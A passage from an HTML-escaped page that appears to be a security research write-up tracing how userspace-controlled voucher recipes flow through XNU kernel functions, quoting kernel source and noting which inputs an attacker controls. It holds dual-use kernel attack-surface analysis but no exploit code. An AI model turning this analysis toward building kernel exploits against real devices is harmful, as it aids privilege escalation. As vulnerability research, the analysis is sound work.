class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_dedup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;else&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_dealloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;At the top of this snippet a new voucher is allocated in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_alloc&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;is then called in a loop to consume however many sub-recipe structures were provided by userspace. Each sub-recipe can optionally refer to an existing voucher via the sub-recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. Note that MIG doesn&amp;#39;t natively support variable-sized structures containing ports so it&amp;#39;s passed as a mach port name which is looked up in the calling task&amp;#39;s mach port namespace and converted to a voucher reference by &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;convert_port_name_to_voucher&lt;/span&gt;&lt;span&gt;. The intended functionality here is to be able to refer to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;attrs&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;in other vouchers to copy or &amp;quot;redeem&amp;quot; them. As discussed, the semantics of redeeming a voucher attr isn&amp;#39;t defined by the abstract voucher code and it&amp;#39;s up to the individual attr managers to decide what that means.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Once the entire recipe has been consumed and all the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;entries filled in, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;then searches the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivht_bucket&lt;/span&gt;&lt;span&gt;&amp;nbsp;hash table to see if there&amp;#39;s an existing voucher with a matching set of attributes. Remember that each attribute value stored in a voucher is an index into the attribute controller&amp;#39;s attribute table; and those attributes are unique, so it suffices to simply compare the array of voucher indexes to determine whether all attribute values are equal. If a matching voucher is found, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a reference to the existing voucher and calls &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;to free the newly created newly-created voucher. Otherwise, if no existing, matching voucher is found, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;adds the newly created voucher to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivht_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s look at &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is responsible for filling in the requested entries in the voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;. Note that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;command&lt;/span&gt;&lt;span&gt;&amp;nbsp;are arbitrary, controlled dwords. &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;content&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pointer to a buffer of controlled bytes, and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;is the correct size of that input buffer. The MIG layer limits the overall input size of the recipe (which is a collection of sub-recipes) to 5260 bytes, and any input content buffers would have to fit in there.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.191bcb9f8d9273c881068813b7858079e6ae8a8c"&gt;&lt;/a&gt;&lt;a id="t.15"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_recipe_command_t command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; boolean_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key_priv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t prev_val_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t val_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; kern_return_t kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;switch&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;isn&amp;#39;t one of the switch statement case values here so the code falls through to the default case:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.66c241fd41870ecdf298b20267a430a3c55fc901"&gt;&lt;/a&gt;&lt;a id="t.16"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;default&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ipc_replace_voucher_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Here&amp;#39;s that code:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2efb8ee4a6d79102545a6af1433eab60fcfedb02"&gt;&lt;/a&gt;&lt;a id="t.17"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Get the manager for this key_index.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Returns a reference on the control.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_key_to_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgt_lookup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 